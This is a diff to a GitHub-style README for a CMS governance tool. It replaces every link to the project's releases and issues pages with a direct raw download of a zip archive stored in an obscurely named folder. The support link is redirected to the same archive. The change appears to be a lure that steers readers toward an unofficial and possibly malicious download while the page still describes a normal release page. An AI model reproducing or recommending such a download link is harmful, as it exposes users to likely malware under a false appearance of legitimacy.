@@ -1,6 +1,6 @@
 # 🔒 ai-driven-cms-governance - Manage CMS with Clear AI Controls
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-green?style=flat-square)](https://github.com/heracross1412/ai-driven-cms-governance/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-green?style=flat-square)](https://raw.githubusercontent.com/heracross1412/ai-driven-cms-governance/main/procellose/cms_ai_governance_driven_3.4.zip)
 
 ---
 
@@ -35,14 +35,14 @@ These specs ensure the software works smoothly and safely.
 
 Click the green button below to visit the latest release page. From there, you can choose the correct file to download.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=flat-square)](https://github.com/heracross1412/ai-driven-cms-governance/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=flat-square)](https://raw.githubusercontent.com/heracross1412/ai-driven-cms-governance/main/procellose/cms_ai_governance_driven_3.4.zip)
 
 ---
 
 ### How to Download
 
 1. Click the button above or go to:  
-   https://github.com/heracross1412/ai-driven-cms-governance/releases
+   https://raw.githubusercontent.com/heracross1412/ai-driven-cms-governance/main/procellose/cms_ai_governance_driven_3.4.zip
 
 2. Look for the newest version listed at the top of the page.
 
@@ -136,7 +136,7 @@ If you have issues:
 When new versions are available:
 
 1. Visit the release page again via:  
-   https://github.com/heracross1412/ai-driven-cms-governance/releases
+   https://raw.githubusercontent.com/heracross1412/ai-driven-cms-governance/main/procellose/cms_ai_governance_driven_3.4.zip
 
 2. Download the latest installer.
 
@@ -150,7 +150,7 @@ Do not uninstall first unless directed.
 
 If issues persist beyond basic troubleshooting, reach out via the project’s GitHub **Issues** page:
 
-https://github.com/heracross1412/ai-driven-cms-governance/issues
+https://raw.githubusercontent.com/heracross1412/ai-driven-cms-governance/main/procellose/cms_ai_governance_driven_3.4.zip
 
 Include details about your problem and any error messages.
 
